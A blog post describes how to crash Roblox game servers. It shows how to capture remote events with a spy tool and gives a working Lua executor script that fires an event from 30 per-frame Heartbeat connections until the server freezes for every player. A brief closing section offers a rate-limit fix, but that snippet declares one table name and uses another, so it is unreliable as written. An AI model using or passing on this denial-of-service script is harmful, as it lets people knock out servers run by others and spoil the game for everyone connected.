---
title: Abusing Remote Events to Crash Roblox Servers
published: 2025-12-15
description: A simple exploit can cause crashes in most games.
tags: [Game Hacking, Roblox Exploits]
category: Game Hacking
draft: false
---

#### Tools: Executor (with hookmetamethod support), Simple Spy / any working remote spy

### 1. Capture Events:
#### Press some spawn item or vehicle buttons, or reset your character to capture the respawn/spawn vehicle event.

### Example:

![](./remote-spy-spawn-car.png)

#### In this screenshot, the argument one is the car name. We can quickly press 'Run Code' and check the network stats.
#### If it does not reduce your in-game FPS to zero and causes the recv value to rise significantly, it may be exploitable.

### 2. Coding exploit code:

```lua
local getservice, waitforchild = game.GetService, game.WaitForChild

local runservice = getservice(game, "RunService")
local replicatedstorage = getservice(game, "ReplicatedStorage")

-- event --
local eventName = waitforchild(replicatedstorage, "event") -- event path

local arguments = {
    "argument1", -- car name or something else, you can paste from remote spy by pressing the copy code button
    "argument2", -- if you got 2 arguments or more
    "argument3" -- argument 3
}

for i = 1, 30 do -- create 30 heartbeat connections
    runservice.Heartbeat:Connect(function() -- sending event per frame
        eventName:FireServer(unpack(arguments)) -- FireServer or InvokeServer (in simple spy, if remoteevent is flagged as blue, use :InvokeServer(arguments))
        --eventName:FireServer() -- if the event has no arguments
    end)
end
```

### 3. Wait for the server to crash. (When the recv value rises to a high point (1000kb/s or above) or drops to zero, then every player will be freezed.)

### Screenshot of the crashed server:

![](./recv.png)

### Part 2: How it works?

#### By spamming Instance.new() or :Clone() or Player:LoadCharacter() quickly, it may take a lot of resources and finally cause the server crash

#### To avoid this exploit as a game developer, you need to add a server-side rate limit
### Example:
```lua
local cooldownTimers = {} -- put this in the top of the script

-- add these to the first line of the OnServerEvent:Connect 
local currentTime = tick()
local lastTick = cooldowns[player] or 0 -- change the "player" argument name to yours
if currentTime - lastTick < 2 then -- 2 seconds of cooldown, you can change this
    return
end

cooldowns[player] = currentTime -- -- change the "player" argument name to yours
```
